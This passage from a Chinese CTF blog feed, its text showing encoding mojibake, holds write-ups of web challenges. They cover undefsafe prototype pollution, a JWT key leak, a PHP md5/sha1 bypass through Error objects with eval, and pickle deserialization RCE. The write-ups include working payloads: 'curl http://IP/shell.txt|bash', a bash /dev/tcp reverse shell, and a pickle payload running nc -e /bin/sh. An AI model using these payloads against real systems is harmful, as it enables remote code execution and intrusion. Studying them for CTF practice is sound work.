å±æ€§ã€‚</p><p>POCå¦‚ä¸‹ï¼Œæ±¡æŸ“åŸå‹é“¾åï¼Œç©ºå¯¹è±¡å¤šäº†ä¸ª<code>ddd</code>å±æ€§ï¼Œä¸”<code>&#123;&#125;.ddd=JHU</code>ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"undefsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"__proto__.ddd"</span><span class="token punctuation">;</span><span class="token function">a</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token string">"JHU"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>ddd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/statusæœ‰å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ‰€ä»¥å¾—æƒ³åŠæ³•æ±¡æŸ“commandså¯¹è±¡ï¼Œä¾‹å¦‚ä»¤commads.a=whoamiï¼Œç„¶åè®¿é—®/statuså®ƒä¼šéå†æ‰§è¡Œcommandså­—å…¸ä¸­çš„å‘½ä»¤ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908120943246.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908131841589.png"></p><p>åœ¨è¿™è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;__proto__&amp;author&#x3D;curl%20http:&#x2F;&#x2F;IP&#x2F;shell.txt|bash&amp;raw&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>shell.txtå†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-SHELL" data-language="SHELL"><code class="language-SHELL">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;9999 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åå¼¹ä¸‹shell</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908125559897.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RootersCTF2019]ImgXweb</title>
      <link href="/p/1573675564.html"/>
      <url>/p/1573675564.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908100333187.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å…³é”®å­—:[jwtè§£å¯†]</p><p>robots.txtæœ‰ä¸œè¥¿</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101025555.png"></p><pre class="line-numbers language-none"><code class="language-none">you-will-never-guess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101320455.png"></p><p>æ”¹æˆadmin</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101419932.png"></p><p>ä¸‹è½½ï¼Œtxtæ‰“å¼€ï¼Œç»“æŸ</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</title>
      <link href="/p/4128421624.html"/>
      <url>/p/4128421624.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[errorç±»|MD5ç»•è¿‡|evalæ‰§è¡Œ]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>åœ¨ç±»é‡Œï¼Œæ— æ³•ç”¨æ•°ç»„è¿›è¡Œmd5ç»•è¿‡ï¼Œæ‰€ä»¥ç”¨Errorç±»ç»•è¿‡md5å’Œsha1æ£€æµ‹</p><p>æµ‹è¯•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ³¨æ„è¿™é‡Œéœ€è¦å†™åœ¨ä¸€è¡Œä¸Š</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"a!=b"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"md5ç›¸ç­‰"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"sha1ç›¸ç­‰"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp/image-20210907185653017.png"></p><p>ç”±äºé¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç›´æ¥<code>include &quot;/flag&quot;</code>å°†flagåŒ…å«è¿›æ¥å³å¯ï¼›ç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œäºæ˜¯åœ¨è¿™é‡Œè¿›è¡Œå–åï¼Œè¿™æ ·è§£ç åå°±è‡ªåŠ¨æ˜¯<strong>å­—ç¬¦ä¸²</strong>ï¼Œæ— éœ€å†åŠ åŒå¼•å·æˆ–å•å¼•å·ã€‚</p><p>è€Œä¸”evalæ‰§è¡Œå¸¦æœ‰å®Œæ•´æ ‡ç­¾çš„è¯­å¥éœ€è¦å…ˆé—­åˆï¼Œå°±ç±»ä¼¼äºå°†å­—ç¬¦ä¸²å½“æˆä»£ç å†™å…¥åˆ°æºç ä¸­ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'?>&lt;?php echo 123;?>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//OUTPUT:123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯ï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?>&lt;?=include~"</span> <span class="token operator">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"?>"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/LYJ20010728/article/details/117429054">[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[watevrCTF-2019]Pickle Store</title>
      <link href="/p/3521738078.html"/>
      <url>/p/3521738078.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[pickleååºåˆ—åŒ–æ¼æ´]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906193015544.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>çœ‹è¿™ä¸ªåå­—å°±æ„Ÿè§‰æ˜¯pythonæ¨¡å—pickleçš„ååºåˆ—åŒ–ç›¸å…³</p><p>ä¸€å¼€å§‹è¦å…ˆbase64è§£ç ä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906193849567.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906194036315.png"></p><p>å› ä¸ºæ˜¯åŠ å¯†çš„ï¼Œæ²¡æ³•ç›´æ¥æ„é€ ï¼Œæ‰€ä»¥ç”¨pickleååºåˆ—åŒ–æ¼æ´ï¼Œå…·ä½“è§æ–‡ç« <a href="https://www.freebuf.com/articles/web/252189.html">Python Pickleååºåˆ—åŒ–æ¼æ´</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">PickleRce</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 172.16.150.14 9999 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>PickleRce<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ•´æ— è¯­äº†ï¼Œåˆä¸è¡Œï¼Œæ— è®ºæ˜¯ç”¨<a href="http://http.requestbin.buuoj.cn/">requestbin</a>è¿˜æ˜¯å†…ç½‘é¶æœºéƒ½ä¸è¡Œï¼Œè¿™éƒ½ç¬¬å››é¢˜äº†ï¼Œä¸€æ¶‰åŠå†…ç½‘å¿…æ‰“ä¸é€šï¼ŒçœŸçš„ç´¯äº†ã€‚</p><p>2021å¹´9æœˆ7æ—¥12:20:16</p><p>å¥½å‹å¸®å¿™æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°å¯ä»¥ç›´æ¥è¿å¤–ç½‘ï¼Œä¸éœ€è¦å†…éƒ¨é¶æœºäº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210907122042627.png"></p><p>æˆ‘æ‚Ÿäº†ï¼Œæ ¹æœ¬ä¸éœ€è¦å†…éƒ¨é¶æœºäº†ï¼Œç°åœ¨æ‰ç†è§£è¿™å¥è¯ä»€ä¹ˆæ„æ€ï¼Œä»¥åç›´æ¥ç”¨<a href="https://beeceptor.com/">beeceptor</a>æˆ–è€…vpså®Œäº‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210907122704483.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç¾ŠåŸæ¯2020]easyphp</title>
      <link href="/p/1631723733.html"/>
      <url>/p/1631723733.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é¢˜ä¹‹å‰åšè¿‡æ¥ç€ï¼Œå¯ä»¥è¯´ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token 